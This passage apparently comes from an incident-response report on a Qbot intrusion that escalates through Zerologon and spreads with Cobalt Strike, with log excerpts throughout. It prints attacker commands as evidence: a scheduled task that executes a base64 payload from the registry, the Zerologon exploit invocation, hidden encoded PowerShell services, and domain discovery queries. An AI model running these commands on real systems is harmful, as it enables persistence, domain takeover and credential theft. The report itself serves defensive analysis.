HKCU\\Software\\Microsoft\\Yerqbqokc\\17737aec\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\d086727f\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\683a151a\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\15325a90\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\ad8e3df5\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\afcf1d89\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\9a50cdc7\n  \n  [1] regsvr32.exe (PID: 2988)\n  [2] explorer.exe (PID: 3916)\n  \n  2656 LOADS\n  852 CREATE PROCESS\n  \n  C:\\Users\\***\\qwrfkxgymyv.dll\n```\n\nThe registry keys contain eight-character long hex strings for which we believe is part of the malware’s encrypted config.\n\n```image\nAlt: Registry Config\nDescription: The image displays a table with several columns related to Windows Registry entries. The columns include 'Value Name,' 'Value Type,' 'Data,' and 'Value Slack.' Each row represents a different registry key, showing various hexadecimal string values encoded in 'Data,' which are presumably linked to malware behavior. The 'Value Type' consistently lists 'RegBinary,' indicating the data is stored in binary form.\nTranscription: |\n  | Value Name | Value Type | Data                                                | Value Slack          |\n  | ---------- | ---------- | --------------------------------------------------- | -------------------- |\n  | sC5d6043   | RegBinary  | 61-06-2A-56-B2-94-BD-EA-F3-67-29-9F-3F-56-EB-17-... | 6F-66                |\n  | d05d20d0   | RegBinary  | 66-5C-5D-D0-3D-87-F6-1F-91-2A-54-33-4C-32-7...      | 00                   |\n  | d2139071   | RegBinary  | 6A-FF-71-4B-8D-8C-F7-3E-6B-11-F0-BD-8B-BA-...       | 00-80-68-46-09-00    |\n  | 6aaff714   | RegBinary  | AF-64-9B-02-05-AD-10-D5-45-28-C9-C5-8C-8...         | 00-53-00-68-00       |\n  | 17a7b89e   | RegBinary  | 26-13-19-3A-7C-1A-7F-24-7E-27-4F-27-...             | 00-00-00             |\n  | af1bdfb    | RegBinary  | 3B-8A-29-64-80-9A-64-80-9A-2D-CE-F8-2A-...          | 00-54-79-70-65-00    |\n  | 9a840fb5   | RegBinary  | 35-AE-8D-F6-9D-ED-47-D4-89-FB-6B-39-F8-...          | 00-18-87-09-00       |\n  | a8b5884b   | RegBinary  | 46-A7-DC-1B-3C-7A-93-7A-2D-7A-3A-...                | 45-00                |\n  | 574a6093   | RegBinary  | 38-4C-32-4C-2E-8C-52-2E-8B-44-18-1C-...             | 24-30-23-39-27-C9-42 |\n  | 45ffc7fd   | RegBinary  | EA-6A-32-4C-4E-2B-4E-2B-44-18-1C-10-D...            | 00-00-00             |\n  | 609490a1   | RegBinary  | 1A-25-2B-51-7F-15-BF-49-AF-39-42-...                | 34                   |\n  | 38f780f7   | RegBinary  | 6E-5B-7F-15-18-F5-1F-49-AF-39-42-...                | 34                   |\n  | 8831a05b   | RegBinary  | A6-9F-61-78-B6-72-0D-20-9A-B3-50-29-E5-EC-1E-BB...  | 34                   |\n```\n\n### Persistence\n\n#### Scheduled Task/Job – Scheduled Task On Beachhead\n\nThe scheduled task created by Qbot was set to run every 30 minutes and executes a base64 encoded payload stored in the Windows Registry.\n\n```\nschtasks.exe /Create /F /TN \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Pvoeooxf).yzbbvhhdypa))) \" /SC MINUTE /MO 30\n```\n\n```image\nAlt: Scheduled Task\nDescription: The image is a screenshot of a Windows Task Scheduler log entry detailing the registration of a scheduled task. It includes specific fields such as LogName, EventCode, EventType, ComputerName, User, Type, RecordNumber, and a message indicating that a user registered a scheduled task with a unique identifier. This information is relevant to understanding the persistence mechanism utilized by Qbot malware.\nTranscription: |\n  LogName: Microsoft-Windows-TaskScheduler/Operational\n  EventCode: 106\n  EventType: 4\n  ComputerName: <REDACTED>\n  User: NOT_TRANSLATED\n  SidType: 0\n  SourceName: Microsoft-Windows-TaskScheduler\n  Type: Information\n  RecordNumber: 2717\n  Keywords: None\n  TaskCategory: Task registered\n  OpCode: Info\n  Message: User <REDACTED> registered Task Scheduler task \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\"\n```\n\n```\nLogName: Microsoft-Windows-TaskScheduler/Operational\nEventCode: 106\nMessage: Task scheduler Task Registered\n```\n\n### Privilege Escalation\n\nThirty minutes after gaining initial access, the threat actors ran an executable file on the beachhead to exploit CVE-2020-1472, Zerologon.\n\nThe executable was named “cool.exe”:\n\n```\nC:\\Windows\\system32\\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c \"taskkill /f /im explorer.exe\"\n```\n\n```image\nAlt: cool.exe\nDescription: |\n  The image is a screenshot of a command-line interface displaying details about a process executed on a Windows system. It includes the\n  - UtcTime: timestamp of the event\n  - ProcessGuid: unique identifier of the process\n  - ProcessId: identifier number of the running process\n  - Image: path to the executable file (cmd.exe)\n  - Description: indicates it is the Windows Command Processor\n  - CommandLine: shows the command used to run the executable, which includes the path to cmd.exe, the execution of 'cool.exe', and a command to terminate explorer.exe.\n  - It also displays placeholders for the Domain Controller IP, Domain name, and Administrator credentials used in the command. This image is relevant to the context, providing technical insights into the process involved in the exploit.\nTranscription: |\n  UtcTime:\n  ProcessGuid: {6634681a-92da-6192-a412-000000000500}\n  ProcessId: 8672\n  Image: C:\\Windows\\SysWOW64\\cmd.exe\n  FileVersion:\n  Description: Windows Command Processor\n  Product: Microsoft® Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: Cmd.Exe\n  CommandLine: C:\\Windows\\system32\\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c \"taskkill /f /im explorer.exe\"\n  CurrentDirectory:\n```\n\nThree milliseconds after the Zerologon exploit, an event 4742 “A computer account was changed.” was generated on the targeted Domain Controller.\n\nAs explained in a detailed blog from CrowdStrike, the ZeroLogon CVE relies on the AES-CFB8 algorithm used with a zero IV:\n\n> “In order to use AES-CFB8 securely, a random initialization vector (IV) needs to be generated for every plaintext to be encrypted using the same key. However, the ComputeNetlogonCredential function sets the IV to a fixed value of 16 zero bytes. This results in a cryptographic flaw in which encryption of 8-bytes of zeros could yield a ciphertext of zeros with a probability of 1 in 256. Another implementation issue that allows this attack is that unencrypted Netlogon sessions aren’t rejected by servers (by default). The combination of these two flaws could allow an attacker to completely compromise the authentication, and thus to impersonate a server of their choice.”\n\nAs we can see on the network captures, a brute-force attack was performed in order to spoof the identity of the domain controller:\n\n```image\nAlt: Brute Force\nDescription: The image depicts network traffic logs related to the RPC_NETLOGON protocol. It shows multiple entries for authentication requests and responses, particularly noting 'STATUS_ACCESS_DENIED' for several attempts, indicating failed authentication attempts. Some lines highlight issues such as 'TCP Spurious Retransmission' and 'TCP Previous segment not captured,' which suggest network anomalies. The overall context is related to a brute-force attack scenario where access to the Domain Controller is being attempted.\nTranscription: |\n  Protocol          Info\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      [TCP Spurious Retransmission] NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      [TCP Previous segment not captured] NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n```\n\nAfter the end of the brute force traffic, we can see a single instance where the exploit has completed successfully.\n\n```image\nAlt: Exploit Success\nDescription: The image displays a network packet capture from a cybersecurity analysis tool. It shows a single frame containing detailed information about a malformed packet related to the Microsoft Network Logon protocol. Key aspects include the Ethernet II source and destination ports, the operation type (NetrServerPasswordSet2), and the timestamp, which appears incorrectly set to 'Dec 31, 1969'. The report also highlights an error indicating a malformed packet, with an associated error level marked as 'Error' and a severity level of 'Error', suggesting that there was an exception during packet processing.\nTranscription: |\n  Frame 938101: 94 bytes on wire (752 bits), 94 bytes captured (752 bits)\n  Ethernet II, Src:\n  Internet Protocol\n  Transmission Control Protocol, Src Port: 49675, Dst Port: 61579, Ack: 41675, Len: 40\n  Distributed Computing Environment / Remote Procedure Call (DCE/RPC) Response, Fragment: Single, FragLen: 40, Call: 548, Ctx: 0, [Req: #938017]\n  Microsoft Network Logon, NetrServerPasswordSet2 (30)\n      Request in frame: 938017\n      AUTHENTICATOR: return_authenticator\n          Referent ID: 0xdd55e901\n          Credential: 080ade8600000000\n          Timestamp: (0)Dec 31, 1969 19:00:00.000000000 EST\n  [Malformed Packet: RPC_NETLOGON]\n      [Expert Info (Error/Malformed): Malformed Packet (Exception occurred)]\n      [Malformed Packet (Exception occurred)]\n      [Severity level: Error]\n      [Group: Malformed]\n```\n\nAfter being successfully authenticated, the DC password was set:\n\n```image\nAlt: DC Password\nDescription: The image is a screenshot of an XML log entry from Microsoft Windows security auditing. It contains detailed information about a security event identified by Event ID 4742, which indicates that a computer account was changed. Key data points include the target username, target domain name, subject username ('ANONYMOUS LOGON'), and the timestamp of the event. The XML structure delineates various attributes associated with the event, providing a technical overview of the changes made to the computer account.\nTranscription: |\n  <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n    <System>\n      <Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-a5ba-3e3b0328c30d}\"/>\n      <EventID>4742</EventID>\n      <Version>0</Version>\n      <Level>0</Level>\n      <Task>13825</Task>\n      <Opcode>0</Opcode>\n      <Keywords>0x8020000000000000</Keywords>\n      <TimeCreated SystemTime=\"T17:03:25.2463168Z\"/>\n      <EventRecordID>13249</EventRecordID>\n      <Execution ProcessID=\"644\" ThreadID=\"224\"/>\n      <Channel>Security</Channel>\n      <Computer>...</Computer>\n    </System>\n    <EventData>\n      <Data Name=\"ComputerAccountChange\">...</Data>\n      <Data Name=\"TargetUserName\">...</Data>\n      <Data Name=\"TargetDomainName\">...</Data>\n      <Data Name=\"TargetSid\">S-1-5-7</Data>\n      <Data Name=\"SubjectUserSid\">S-1-5-7</Data>\n      <Data Name=\"SubjectUserName\">ANONYMOUS LOGON</Data>\n      <Data Name=\"SubjectDomainName\">NT AUTHORITY</Data>\n      <Data Name=\"PrivilegeList\">...</Data>\n      <Data Name=\"SubjectLogonId\">0x3e6</Data>\n      <Data Name=\"SamAccountName\">...</Data>\n      <Data Name=\"DisplayName\">...</Data>\n      <Data Name=\"HomeDirectory\">...</Data>\n      <Data Name=\"HomePath\">...</Data>\n      <Data Name=\"ScriptPath\">...</Data>\n      <Data Name=\"ProfilePath\">...</Data>\n      <Data Name=\"UserWorkstations\">...</Data>\n      <Data Name=\"PasswordLastSet\">5:03:25 PM</Data>\n      <Data Name=\"UserAccountExpires\">...</Data>\n      <Data Name=\"PrimaryGroupId\">...</Data>\n      <Data Name=\"HomeDirectory\">...</Data>\n      <Data Name=\"OldValue\">...</Data>\n      <Data Name=\"UserAccountControl\">...</Data>\n      <Data Name=\"SidHistory\">...</Data>\n      <Data Name=\"LogonHours\">...</Data>\n      <Data Name=\"DnsHostName\">...</Data>\n      <Data Name=\"ServicePrincipalNames\">...</Data>\n    </EventData>\n  </Event>\n```\n\nThe `PasswordLastSet` field is equal to the `TimeCreated` field, meaning that the password of the domain controller was successfully updated. We can also see that the `SubjectUserName` is `ANONYMOUS LOGON`.\n\nA connection was performed from the beachhead to the Domain Controller using the DC account. After authenticating to the DC with the DC account, the threat actors dumped the Domain Admin hash, and then reset the DC password in order to unbreak the Active Directory Domain.\n\n```image\nAlt: Domain Admin Hash\nDescription: The image displays a Windows Event Log entry (Event 7045) from the Service Control Manager. It provides details about a service that was installed on the system. The log includes the following key information: the service name 'LMMCP00MEDEFHBDAMBML', the service file name which is a PowerShell command to reset the computer's machine password, the service type classified as a user mode service, the service start type labeled as 'demand start', and the service account specified as 'LocalSystem'. This information is relevant for analyzing potential unauthorized service installations and security breaches.\nTranscription: |\n  Event 7045, Service Control Manager\n  \n  General\n  Details\n  \n  A service was installed in the system.\n  Service Name: LMMCPOOMEDEFHBDAAMBML\n  Service File Name: powershell.exe -c Reset-ComputerMachinePassword\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\n```\n\nThe explorer shell was also restarted by the threat actor:\n\n```image\nAlt: Explorer Restart\nDescription: The image displays a Windows Event Viewer screenshot showing Event ID 7045, which indicates that a new service was installed on the system. It includes details such as the service name (ANFDHCOCLIICFDIPINAD), the service file name (a command to execute ‘taskkill’), the service type (user mode service), the start type (demand start), and the service account (LocalSystem). This information is relevant in the context of monitoring system changes and potential malicious activities.\nTranscription: |\n  Event 7045, Service Control Manager\n  \n  A service was installed in the system.\n  Service Name: ANFDHCOCLIICFDIPINAD\n  Service File Name: %COMSPEC% /C \"taskkill /f /im explorer.exe\"\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\n```\n\n### Defense Evasion\n\nUpon execution of the initial DLL, QBot uses process hollowing to start a suspended instance of explorer.exe (32-bit) and then injects itself into this process.\n\n```image\nAlt: Process Hollowing\nDescription: The image displays a log entry related to a security event in a Windows environment. It includes various fields such as LogName, EventCode, EventType, ComputerName, SourceName, and details about the process creation event. Key information includes the Creator Subject's Security ID and Logon ID, the Target Subject's Security ID, and the Process Information detailing the New Process ID, New Process Name, and Command Line. This log entry specifically indicates that a new process has been created, providing insight into potential suspicious activity related to process creation.\nTranscription: |\n  LogName=Security\n  EventCode=4688\n  EventType=0\n  ComputerName=\n  SourceName=Microsoft Windows security auditing.\n  Type=Information\n  RecordNumber=38250\n  Keywords=Audit Success\n  TaskCategory=Process Creation\n  OpCode=Info\n  Message=A new process has been created.\n  \n  Creator Subject:\n      Security ID:\n      Account Name:\n      Account Domain:\n      Logon ID: 0x741A48\n  \n  Target Subject:\n      Security ID: S-1-0-0\n      Account Name: -\n      Account Domain: -\n      Logon ID: 0x0\n  \n  Process Information:\n      New Process ID: 0x1958\n      New Process Name: C:\\Windows\\SysWOW64\\explorer.exe\n      Token Elevation Type: %%1936\n      Mandatory Label: S-1-16-8192\n      Creator Process ID: 0x32b4\n      Creator Process Name: C:\\Windows\\SysWOW64\\rundll32.exe\n      Process Command Line: C:\\Windows\\SysWOW64\\explorer.exe\n```\n\nThe injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit). An example event can be seen below. Source PID 10492 belonging to QBot, injected a DLL into PID 4072 which we discovered was part of Cobalt Strike C2 communication.\n\n```image\nAlt: Cobalt Strike Communication\nDescription: The image displays a log entry from the Microsoft Windows Sysmon (System Monitor) detailing a process access event. It includes various information fields such as EventCode, EventType, ComputerName, and specifics about the Source and Target processes involved in a Dynamic-link Library (DLL) injection technique. Key details highlighted include SourceProcessId (10492) and TargetProcessId (4072), both referencing instances of explorer.exe. The log also mentions the technique ID (T1055.001), indicating that this relates to process injection methods, which is relevant to cyber threat intelligence.\nTranscription: |\n  LogName=Microsoft-Windows-Sysmon/Operational\n  EventCode=10\n  EventType=4\n  ComputerName=DESKTOP-XXXXXXX\n  User=NOT_TRANSLATED\n  Sid=S-1-5-18\n  SidType=0\n  SourceName=Microsoft-Windows-Sysmon\n  Type=Information\n  RecordNumber=38015\n  Keywords=None\n  TaskCategory=Process accessed (rule: ProcessAccess)\n  OpCode=Info\n  Message=Process accessed:\n  RuleName: technique_id=T1055.001, technique_name=Dynamic-link Library Injection\n  UtcTime: [REDACTED]\n  SourceProcessGUID: {6634681a-8d6d-6192-3312-000000000500}\n  SourceProcessId: 10492\n  SourceThreadId: 11956\n  SourceImage: C:\\Windows\\SysWOW64\\explorer.exe\n  TargetProcessGUID: {6634681a-9429-6192-c412-000000000500}\n  TargetProcessId: 4072\n  TargetImage: C:\\Windows\\SysWOW64\\explorer.exe\n  GrantedAccess: 0x1FFFFF\n```\n\n#### Over-Pass-the-Hash from Beachhead\n\nThe threat actor obtained the NTLM hash value of the administrator account through the Zerologon exploit and used over-pass-the-hash to request a TGT from the domain controller. We have seen the use of over-pass-the-hash several times before. For example, our Cobalt Strike Defender Guide covers detection of this technique in more detail.\n\n```image\nAlt: Over-Pass-the-Hash\nDescription: The image displays the properties of a security event (Event ID 4624) from a Microsoft Windows security auditing log. It details a successful logon event, including information such as the Security ID, Account Name, Logon Type, and Process Information. The log outlines the account that was logged on, the associated security identifiers, and details about the logon process, including the source address and the authentication package used.\nTranscription: |\n  Event Properties - Event 4624, Microsoft Windows security auditing.\n  \n  General\n  Details\n  \n  An account was successfully logged on.\n  \n  Subject:\n    Security ID: S-1-5-21-853439379-3680187918-914098032-1115\n    Account Name:\n    Account Domain:\n    Logon ID: 0x39D591C\n  \n  Logon Information:\n    Logon Type: 9\n    Restricted Admin Mode: -\n    Virtual Account: No\n    Elevated Token: No\n  \n  Impersonation Level: Impersonation\n  \n  New Logon:\n    Security ID: S-1-5-21-853439379-3680187918-914098032-1115\n    Account Name:\n    Account Domain:\n    Logon ID: 0x39E88DB\n    Linked Logon ID: 0x0\n    Network Account Name: Administrator\n    Network Account Domain:\n    Logon GUID: {00000000-0000-0000-0000-000000000000}\n  \n  Process Information:\n    Process ID: 0xaf4\n    Process Name: C:\\Windows\\System32\\svchost.exe\n  \n  Network Information:\n    Workstation Name:\n    Source Network Address: ::1\n    Source Port: 0\n  \n  Detailed Authentication Information:\n    Logon Process: seclog\n    Authentication Package: Negotiate\n    Transited Services:\n    Package Name (NTLM only): -\n    Key Length: 0\n```\n\nSoon after, a TGT for the administrator account was requested:\n\n```image\nAlt: TGT Request\nDescription: The image displays a screenshot of the Event Properties for Event ID 4768, indicating a request for a Kerberos authentication ticket (TGT). It contains detailed information about the account making the request (Administrator), the service involved (krbtgt), and the associated network information including client address and port. Additional details on ticket options, result code, ticket encryption type, and pre-authentication type are also provided, making it a relevant and informative resource for analyzing authentication requests in a cybersecurity context.\nTranscription: |\n  Event Properties - Event 4768, Microsoft Windows security auditing.\n  \n  General\n  Details\n  \n  A Kerberos authentication ticket (TGT) was requested.\n  \n  Account Information:\n  - Account Name: Administrator\n  - Supplied Realm Name:\n  - User ID: S-1-5-21-853439379-3680187918-914098032-500\n  \n  Service Information:\n  - Service Name: krbtgt\n  - Service ID: S-1-5-21-853439379-3680187918-914098032-502\n  \n  Network Information:\n  - Client Address: :::ffff:10.155.25.134\n  - Client Port: 61689\n  \n  Additional Information:\n  - Ticket Options: 0x40810010\n  - Result Code: 0x0\n  - Ticket Encryption Type: 0x12\n  - Pre-Authentication Type: 2\n  \n  Certificate Information:\n  - Certificate Issuer Name:\n  - Certificate Serial Number:\n  - Certificate Thumbprint:\n  \n  Certificate information is only provided if a certificate was used for pre-authentication.\n  Pre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120.\n```\n\n### Discovery\n\nQBot initially starts a number of processes to collect information about the affected system. This is part of the “SYSTEM INFO” bot request, as described in a recent article from SecureList.\n\n```image\nAlt: System Info\nDescription: The image displays a table containing data related to system commands executed during a cybersecurity event. It includes columns for 'ParentImage,' 'CommandLine,' and 'TaskCategory,' listing various commands such as 'whoami /all,' 'ipconfig /all,' and 'nslookup.' Each command is associated with the 'explorer.exe' process, indicating that these commands are part of the discovery phase in a potential attack, reflecting the operational tactics used to gather information about the affected system and network.\nTranscription: |\n  | ParentImage         | CommandLine                                              | TaskCategory                         |\n  | ------------------- | -------------------------------------------------------- | ------------------------------------ |\n  | C:\\Windows\\SysWOW64 | whoami /all                                              | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | cmd /c set                                               | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | ipconfig /all                                            | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | net view /all                                            | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | nslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._msdc. | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | net share                                                | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | route print                                              | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | netstat -nao                                             | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | net localgroup                                           | Process Create (rule: ProcessCreate) |\n```\n\nLater, more discovery commands were executed via the Cobalt Strike beacon, which gathered information about the active directory environment.\n\n```image\nAlt: Active Directory Discovery\nDescription: The image depicts a table detailing command-line activities related to process creation on a Windows system. It includes columns for 'ParentImage', 'CommandLine', and 'TaskCategory', showing various commands executed, such as retrieving group information from a domain and executing a ping command. This information is relevant for understanding the investigative steps taken during a cybersecurity incident involving QBot.\nTranscription: |\n  | ParentImage                      | CommandLine                                                                               | TaskCategory                         |\n  | -------------------------------- | ----------------------------------------------------------------------------------------- | ------------------------------------ |\n  | C:\\Windows\\SysWOW64\\explorer.exe | net group \"domain admins\" /domain                                                         | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\explorer.exe | net group \"domain controllers\" /domain                                                    | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\explorer.exe | C:\\Windows\\system32\\cmd.exe /C c:\\windows\\sysnative\\nltest.exe /domain_trusts /all_trusts | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\explorer.exe | C:\\Windows\\system32\\cmd.exe /C ping -n 1                                                  | Process Create (rule: ProcessCreate) |\n```\n\n#### ADFind (renamed in find.exe) used to enumerate computers\n\n```\nC:\\redacted\\find.exe  -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n```\n\n```image\nAlt: ADFind\nDescription: The image displays technical information about the tool 'find.exe', which is known as AdFind. It includes details such as the file version (1.52.0.5064), product name (AdFind), company (www.joeware.net), original file name (AdFind.exe), and the command line used to execute the tool. The command line demonstrates how the tool is utilized to enumerate computer objects in an Active Directory environment, specifically fetching attributes like name, common name (cn), operating system, and DNS host name in CSV format.\nTranscription: |\n  Image:                find.exe\n  FileVersion:          1.52.0.5064\n  Description:          -\n  Product:              AdFind\n  Company:              www.joeware.net\n  OriginalFileName:     AdFind.exe\n  CommandLine:          C:\\find.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n```\n\nOn the Domain Controller, the threat actors gathered information about the installed security software through WMI:\n\n```image\nAlt: WMI Query\nDescription: The image displays a table containing process creation logs related to a Windows environment. It includes columns for 'ParentImage,' 'CommandLine,' and 'TaskCategory.' The 'ParentImage' column indicates the use of PowerShell, while the 'CommandLine' column shows various commands executed via cmd.exe to query security software components using Windows Management Instrumentation (WMI). The 'TaskCategory' column specifies that these actions are categorized as 'Process Create.' This data is relevant for understanding the actions taken by threat actors during a domain compromise.\nTranscription: |\n  | ParentImage                                               | CommandLine                                                                                              | TaskCategory                         |\n  | --------------------------------------------------------- | -------------------------------------------------------------------------------------------------------- | ------------------------------------ |\n  | C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe | C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiSpywareProduct GET /value | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe | C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value   | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe | C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH FirewallProduct GET /value    | Process Create (rule: ProcessCreate) |\n```\n\n```\nC:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiSpywareProduct GET /value\nC:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\nC:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH FirewallProduct GET /value\n```\n\n#### Ping was used to verify machines were online\n\n```\nping -n 1 [REDACTED]\n```\n\n### Lateral Movement\n\nThrough the creation of Windows services, Cobalt Strike Beacons (psexec_psh function) were deployed on multiple hosts within the environment.\n\n```\nEventCode: 7045\nService File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand <redacted>\nUser: NT AUTHORITY\\SYSTEM\nParentImage: C:\\Windows\\System32\\services.exe\nParentCommandLine: C:\\Windows\\system32\\services.exe\n```\n\nOn the first Domain Controller, a Cobalt Strike service was installed:\n\n```image\nAlt: Cobalt Strike Service\nDescription: The image displays a Windows Event Log entry with details about a service installation related to a Cobalt Strike operation. Key information includes the EventCode (7045), indicating a service was installed, the Service File Name which shows the command executed (including PowerShell and an encoded command), the User account under which the service was created (LocalSystem), and other attributes like the ComputerName and types of the service. This log entry is crucial for understanding the lateral movement of malware in a network.\nTranscription: |\n  LogName: System\n  EventCode: 7045\n  EventType: 4\n  ComputerName: <redacted>\n  User: NOT_TRANSLATED\n  SidType: 0\n  SourceName: Microsoft-Windows-Service Control Manager\n  Type: Information\n  RecordNumber: 2730\n  TaskCategory: None\n  OpCode: The operation completed successfully.\n  Message: A service was installed in the system.\n  \n  Service Name: af5ff02\n  Service File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzADOATgB1AHcALQBpAGMAdABlAG8AQgB5AFMAZABhAGUAYQBuAGQAYQAgAGUAbgB0AGUAcgB0AGUAcgB0AGUAcgB0AGUAcgB...\n```\n\n```\nLog Source: Microsoft-Windows-Service Control Manager Event ID:7045\n```\n\nMultiple services were installed by Cobalt Strike across the environment, here are a few examples:\n\n```\nHKLM\\System\\CurrentControlSet\\Services\\3141131\\ImagePath\nHKLM\\System\\CurrentControlSet\\Services\\af5ff02\\ImagePath\nHKLM\\System\\CurrentControlSet\\Services\\c46234f\\ImagePath\n```\n\nCobalt Strike first calls `OpenSCManagerW` to create the service remotely, then starts it with `StartServiceA` function:\n\n```image\nAlt: Service Creation\nDescription: The image displays a network packet capture related to the execution of the `OpenSCManagerW` and `StartServiceA` functions, which are part of the Cobalt Strike malware's lateral movement technique. The upper part shows timestamps, source, and destination ports, indicating communication between a compromised host and a domain controller. The lower part provides detailed information about the captured frame, including frame size, Ethernet II details, and the Internet Protocol version 4 data. This image contains technical details pertinent to cyber threat analysis.\nTranscription: |\n  Frame 1306464: 194 bytes on wire (1552 bits), 194 bytes captured (1552 bits)\n  Ethernet II, Src: <redacted>, Dst: <redacted>\n  Internet Protocol Version 4, Src: BeachHead IP, Dst: DC IP\n  Transmission Control Protocol, Src Port: 61768, Dst Port: 49729, Seq: 14613, Ack: 679, Len: 140\n  Distributed Computing Environment / Remote Procedure Call (DCE/RPC) Request, Fragment: Single, Fragment Offset: 0\n  ```\n  \n  ```\n  17:15:47.907308 61768 SVCCtl OpenSCManagerW request\n  17:15:47.908686 49729 SVCCtl OpenSCManagerW response\n  17:15:47.914445 49729 SVCCtl Unknown operation 60 response\n  17:15:47.915546 61768 SVCCtl StartServiceA request\n  17:15:48.031885 49729 SVCCtl StartServiceA response\n```\n\n#### RDP/interactive Logins\n\nVarious commands were executed to enable the RDP service on various 